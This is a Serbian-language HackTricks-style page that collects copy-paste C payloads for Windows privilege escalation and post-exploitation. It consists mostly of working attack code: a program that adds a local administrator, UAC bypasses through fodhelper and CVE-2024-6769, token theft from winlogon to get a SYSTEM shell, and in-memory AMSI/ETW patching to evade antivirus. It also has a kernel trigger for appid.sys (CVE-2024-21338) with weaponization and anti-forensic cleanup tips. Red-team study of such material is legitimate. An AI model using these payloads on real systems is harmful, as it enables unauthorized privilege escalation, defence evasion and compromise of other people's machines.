# Windows C Payloads

{{#include ../../banners/hacktricks-training.md}}

Ova stranica prikuplja **male, samostalne C isečke koda** koji su korisni tokom Windows Local Privilege Escalation ili post-exploitation aktivnosti. Svaki payload je dizajniran tako da bude **pogodan za copy-paste**, zahteva samo Windows API / C runtime i može se kompajlirati pomoću `i686-w64-mingw32-gcc` (x86) ili `x86_64-w64-mingw32-gcc` (x64).

> ⚠️  Ovi payloadi pretpostavljaju da proces već ima minimalne privilegije neophodne za izvršavanje radnje (npr. `SeDebugPrivilege`, `SeImpersonatePrivilege` ili medium-integrity kontekst za UAC bypass). Namenjeni su za **red-team ili CTF okruženja** u kojima je iskorišćavanjem ranjivosti ostvareno izvršavanje proizvoljnog native koda.

---

## Dodavanje lokalnog administratora kao korisnika
```c
// i686-w64-mingw32-gcc -s -O2 -o addadmin.exe addadmin.c
#include <stdlib.h>
int main(void) {
system("net user hacker Hacker123! /add");
system("net localgroup administrators hacker /add");
return 0;
}
```
---

## UAC Bypass – `fodhelper.exe` Registry Hijack (srednji → visoki integritet)
Kada se izvrši pouzdani binarni fajl **`fodhelper.exe`**, on upituje putanju registra ispod **bez filtriranja glagola `DelegateExecute`**. Postavljanjem naše komande pod taj ključ, napadač može da zaobiđe UAC *bez upisivanja fajla na disk*.<sup>[[1]](#references)</sup>

*Putanja registra koju upituje `fodhelper.exe`*
```
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
Minimalni PoC koji pokreće `cmd.exe` sa povišenim privilegijama:
```c
// x86_64-w64-mingw32-gcc -municode -s -O2 -o uac_fodhelper.exe uac_fodhelper.c
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int main(void) {
HKEY hKey;
const char *payload = "C:\\Windows\\System32\\cmd.exe"; // change to arbitrary command

// 1. Create the vulnerable registry key
if (RegCreateKeyExA(HKEY_CURRENT_USER,
"Software\\Classes\\ms-settings\\Shell\\Open\\command", 0, NULL, 0,
KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {

// 2. Set default value => our payload
RegSetValueExA(hKey, NULL, 0, REG_SZ,
(const BYTE*)payload, (DWORD)strlen(payload) + 1);

// 3. Empty "DelegateExecute" value = trigger (")
RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ,
(const BYTE*)"", 1);

RegCloseKey(hKey);

// 4. Launch auto-elevated binary
system("fodhelper.exe");
}
return 0;
}
```
*Testirano na Windows 10 22H2 i Windows 11 23H2 (zakrpe iz jula 2025). Bypass i dalje funkcioniše jer Microsoft nije popravio nedostajuću proveru integriteta u `DelegateExecute` putanji.*

---

## UAC Bypass – Activation Context Cache Poisoning (`ctfmon.exe`, CVE-2024-6769)
Preusmeravanje diska + activation context cache poisoning i dalje funkcioniše protiv zakrpljenih Windows 10/11 buildova, jer `ctfmon.exe` radi kao trusted UI proces visokog integriteta koji bez problema učitava sadržaj sa `C:` diska impersoniranog pozivaoca i ponovo koristi sva DLL preusmeravanja koja je `CSRSS` keširao. Zloupotreba se odvija na sledeći način: preusmerite `C:` na storage kojim upravlja attacker, postavite trojanizovani `msctf.dll`, pokrenite `ctfmon.exe` da biste dobili visok integritet, a zatim zatražite od `CSRSS` da kešira manifest koji preusmerava DLL koji koristi auto-elevated binary (npr. `fodhelper.exe`), tako da sledeće pokretanje nasledi vaš payload bez UAC prompta.<sup>[[5]](#references)</sup>

Praktičan workflow:
1. Pripremite lažno `%SystemRoot%\System32` stablo i kopirajte legitimni binary koji planirate da hijackujete (često `ctfmon.exe`).
2. Upotrebite `DefineDosDevice(DDD_RAW_TARGET_PATH)` da preusmerite `C:` unutar svog procesa, uz zadržavanje `DDD_NO_BROADCAST_SYSTEM` kako bi promena ostala lokalna.
3. Postavite svoj DLL + manifest u lažno stablo, pozovite `CreateActCtx/ActivateActCtx` da ubacite manifest u activation-context cache, a zatim pokrenite auto-elevated binary tako da razreši preusmereni DLL direktno u vaš shellcode.
4. Obrišite cache unos (`sxstrace ClearCache`) ili restartujte sistem kada završite kako biste uklonili tragove attackera.

<details>
<summary>C - Pomoćnik za trovanje lažnog diska + manifesta (CVE-2024-6769)</summary>
```c
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <shlwapi.h>
#pragma comment(lib, "shlwapi.lib")

BOOL WriteWideFile(const wchar_t *path, const wchar_t *data) {
HANDLE h = CreateFileW(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if (h == INVALID_HANDLE_VALUE) return FALSE;
DWORD bytes = (DWORD)(wcslen(data) * sizeof(wchar_t));
BOOL ok = WriteFile(h, data, bytes, &bytes, NULL);
CloseHandle(h);
return ok;
}

int wmain(void) {
const wchar_t *stage = L"C:\\Users\\Public\\fakeC\\Windows\\System32";
SHCreateDirectoryExW(NULL, stage, NULL);
CopyFileW(L"C:\\Windows\\System32\\ctfmon.exe", L"C:\\Users\\Public\\fakeC\\Windows\\System32\\ctfmon.exe", FALSE);
CopyFileW(L".\\msctf.dll", L"C:\\Users\\Public\\fakeC\\Windows\\System32\\msctf.dll", FALSE);

DefineDosDeviceW(DDD_RAW_TARGET_PATH | DDD_NO_BROADCAST_SYSTEM,
L"C:", L"\\??\\C:\\Users\\Public\\fakeC");

const wchar_t manifest[] =
L"<?xml version='1.0' encoding='UTF-8' standalone='yes'?>"
L"<assembly xmlns='urn:schemas-microsoft-com:asm.v1' manifestVersion='1.0'>"
L" <dependency><dependentAssembly>"
L"  <assemblyIdentity name='Microsoft.Windows.Common-Controls' version='6.0.0.0'"
L"   processorArchitecture='amd64' publicKeyToken='6595b64144ccf1df' language='*' />"
L"  <file name='advapi32.dll' loadFrom='C:\\Users\\Public\\fakeC\\Windows\\System32\\msctf.dll' />"
L" </dependentAssembly></dependency></assembly>";
WriteWideFile(L"C:\\Users\\Public\\fakeC\\payload.manifest", manifest);

ACTCTXW act = { sizeof(act) };
act.lpSource = L"C:\\Users\\Public\\fakeC\\payload.manifest";
ULONG_PTR cookie = 0;
HANDLE ctx = CreateActCtxW(&act);
ActivateActCtx(ctx, &cookie);

STARTUPINFOW si = { sizeof(si) };
PROCESS_INFORMATION pi = { 0 };
CreateProcessW(L"C:\\Windows\\System32\\ctfmon.exe", NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);

WaitForSingleObject(pi.hProcess, 2000);
DefineDosDeviceW(DDD_REMOVE_DEFINITION, L"C:", L"\\??\\C:\\Users\\Public\\fakeC");
return 0;
}
```
</details>

Savet za čišćenje: nakon dobijanja SYSTEM privilegija, pozovite `sxstrace Trace -logfile %TEMP%\sxstrace.etl`, a zatim `sxstrace Parse` tokom testiranja—ako u logu vidite ime svog manifesta, mogu ga videti i defenders, zato menjajte putanje pri svakom pokretanju.

---

## Spawn SYSTEM shell via token duplication (`SeDebugPrivilege` + `SeImpersonatePrivilege`)
Ako trenutni proces poseduje **oba** privilegija, `SeDebug` i `SeImpersonate` (što je uobičajeno za mnoge service accounts), možete ukrasti token iz `winlogon.exe`, duplicirati ga i pokrenuti proces sa povišenim privilegijama:
```c
// x86_64-w64-mingw32-gcc -O2 -o system_shell.exe system_shell.c -ladvapi32 -luser32
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

DWORD FindPid(const wchar_t *name) {
PROCESSENTRY32W pe = { .dwSize = sizeof(pe) };
HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
if (snap == INVALID_HANDLE_VALUE) return 0;
if (!Process32FirstW(snap, &pe)) return 0;
do {
if (!_wcsicmp(pe.szExeFile, name)) {
DWORD pid = pe.th32ProcessID;
CloseHandle(snap);
return pid;
}
} while (Process32NextW(snap, &pe));
CloseHandle(snap);
return 0;
}

int wmain(void) {
DWORD pid = FindPid(L"winlogon.exe");
if (!pid) return 1;

HANDLE hProc   = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
HANDLE hToken  = NULL, dupToken = NULL;

if (OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken) &&
DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dupToken)) {

STARTUPINFOW si = { .cb = sizeof(si) };
PROCESS_INFORMATION pi = { 0 };
if (CreateProcessWithTokenW(dupToken, LOGON_WITH_PROFILE,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL, CREATE_NEW_CONSOLE,
NULL, NULL, &si, &pi)) {
CloseHandle(pi.hProcess);
CloseHandle(pi.hThread);
}
}
if (hProc) CloseHandle(hProc);
if (hToken) CloseHandle(hToken);
if (dupToken) CloseHandle(dupToken);
return 0;
}
```
Za dublje objašnjenje kako to funkcioniše pogledajte:

{{#ref}}
sedebug-+-seimpersonate-copy-token.md
{{#endref}}

---

## In-Memory AMSI & ETW Patch (Defence Evasion)
Većina modernih AV/EDR engine-a oslanja se na **AMSI** i **ETW** za ispitivanje zlonamernog ponašanja. Rano patchovanje oba interfejsa unutar trenutnog procesa sprečava skeniranje script-based payload-a (npr. PowerShell, JScript).<sup>[[2]](#references)</sup>
```c
// gcc -o patch_amsi.exe patch_amsi.c -lntdll
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdio.h>

void Patch(BYTE *address) {
DWORD oldProt;
// mov eax, 0x80070057 ; ret  (AMSI_RESULT_E_INVALIDARG)
BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
VirtualProtect(address, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProt);
memcpy(address, patch, sizeof(patch));
VirtualProtect(address, sizeof(patch), oldProt, &oldProt);
}

int main(void) {
HMODULE amsi  = LoadLibraryA("amsi.dll");
HMODULE ntdll = GetModuleHandleA("ntdll.dll");

if (amsi)  Patch((BYTE*)GetProcAddress(amsi,  "AmsiScanBuffer"));
if (ntdll) Patch((BYTE*)GetProcAddress(ntdll, "EtwEventWrite"));

MessageBoxA(NULL, "AMSI & ETW patched!", "OK", MB_OK);
return 0;
}
```
*Gornja izmena je lokalna za proces; pokretanje novog PowerShell procesa nakon njenog izvršavanja će se izvršiti bez AMSI/ETW inspekcije.*

---

## Kreiranje child procesa kao Protected Process Light (PPL)
Zatražite nivo PPL zaštite za child proces prilikom kreiranja koristeći `STARTUPINFOEX` + `PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL`. Ovo je dokumentovani API i uspeće samo ako je ciljna slika potpisana za zahtevanu klasu potpisnika (Windows/WindowsLight/Antimalware/LSA/WinTcb).<sup>[[3]](#references)[[4]](#references)</sup>
```c
// x86_64-w64-mingw32-gcc -O2 -o spawn_ppl.exe spawn_ppl.c
#include <windows.h>

int wmain(void) {
STARTUPINFOEXW si = {0};
PROCESS_INFORMATION pi = {0};
si.StartupInfo.cb = sizeof(si);

SIZE_T attrSize = 0;
InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);
si.lpAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attrSize);
InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attrSize);

DWORD lvl = PROTECTION_LEVEL_ANTIMALWARE_LIGHT; // choose the desired level
UpdateProcThreadAttribute(si.lpAttributeList, 0,
PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL,
&lvl, sizeof(lvl), NULL, NULL);

if (!CreateProcessW(L"C\\\Windows\\\System32\\\notepad.exe", NULL, NULL, NULL, FALSE,
EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi)) {
// likely ERROR_INVALID_IMAGE_HASH (577) if the image is not properly signed for that level
return 1;
}
DeleteProcThreadAttributeList(si.lpAttributeList);
HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
CloseHandle(pi.hThread);
CloseHandle(pi.hProcess);
return 0;
}
```
Najčešće korišćeni nivoi:
- `PROTECTION_LEVEL_WINDOWS_LIGHT` (2)
- `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` (3)
- `PROTECTION_LEVEL_LSA_LIGHT` (4)

Validirajte rezultat pomoću Process Explorer/Process Hacker tako što ćete proveriti kolonu Protection.

---

## Local Service -> Kernel via `appid.sys` Smart-Hash (`IOCTL 0x22A018`, CVE-2024-21338)
`appid.sys` izlaže device object (`\\.\\AppID`) čiji smart-hash maintenance IOCTL prihvata function pointers koje zadaje korisnik kad caller radi kao `LOCAL SERVICE`; Lazarus to zloupotrebljava za onemogućavanje PPL-a i učitavanje proizvoljnih drivera, pa red teams treba da imaju spreman trigger za upotrebu u lab okruženju.<sup>[[6]](#references)</sup>

Operativne napomene:
- I dalje vam je potreban `LOCAL SERVICE` token. Ukradite ga iz `Schedule` ili `WdiServiceHost` pomoću `SeImpersonatePrivilege`, a zatim izvršite impersonation pre pristupanja device-u kako bi ACL provere prošle.
- IOCTL `0x22A018` očekuje strukturu koja sadrži dva callback pointera (query length + read function). Usmerite oba na user-mode stubove koji konstruišu token overwrite ili mapiraju ring-0 primitive, ali zadržite buffere kao RWX kako KernelPatchGuard ne bi izazvao crash usred chain-a.
- Nakon uspeha izađite iz impersonation-a i izvršite revert device handle-a; defenderi sada traže neočekivane `Device\\AppID` handle-ove, zato ga odmah zatvorite čim dobijete privilegije.

<details>
<summary>C - Skeleton trigger za `appid.sys` smart-hash abuse</summary>
```c
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>

typedef struct _APPID_SMART_HASH {
ULONGLONG UnknownCtx[4];
PVOID QuerySize;   // called first
PVOID ReadBuffer;  // called with size returned above
BYTE  Reserved[0x40];
} APPID_SMART_HASH;

DWORD WINAPI KernelThunk(PVOID ctx) {
// map SYSTEM shellcode, steal token, etc.
return 0;
}

int wmain(void) {
HANDLE hDev = CreateFileW(L"\\\\.\\AppID", GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
if (hDev == INVALID_HANDLE_VALUE) {
printf("[-] CreateFileW failed: %lu\n", GetLastError());
return 1;
}

APPID_SMART_HASH in = {0};
in.QuerySize = KernelThunk;
in.ReadBuffer = KernelThunk;

DWORD bytes = 0;
if (!DeviceIoControl(hDev, 0x22A018, &in, sizeof(in), NULL, 0, &bytes, NULL)) {
printf("[-] DeviceIoControl failed: %lu\n", GetLastError());
}
CloseHandle(hDev);
return 0;
}
```
</details>

Minimalna dorada za weaponized build: mapirajte RWX odeljak pomoću `VirtualAlloc`, kopirajte svoj token duplication stub tamo, postavite `KernelThunk = section`, i čim se `DeviceIoControl` vrati, trebalo bi da budete SYSTEM čak i pod PPL.

---

## Reference

- [1] [Prvi unos: Dobrodošlica i fileless UAC bypass (fodhelper.exe / ms-settings DelegateExecute)](https://winscripting.blog/2017/05/12/first-entry-welcome-and-uac-bypass/)
- [2] [Memory Patching AMSI Bypass](https://rastamouse.me/memory-patching-amsi-bypass/)
- [3] [CreateProcessAsPPL – minimalni PPL launcher procesa](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [4] [Funkcija UpdateProcThreadAttribute (Win32 apps) - Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-updateprocthreadattribute)
- [5] [Novi Exploit Chain omogućava Windows UAC Bypass](https://www.darkreading.com/vulnerabilities-threats/exploit-chain-windows-uac-bypass)
- [6] [Lazarus i FudModule Rootkit: Beyond BYOVD with an Admin-to-Kernel Zero-Day](https://www.gendigital.com/blog/insights/research/lazarus-and-the-fudmodule-rootkit-beyond-byovd-with-an-admin-to-kernel-zero-day)

{{#include ../../banners/hacktricks-training.md}}
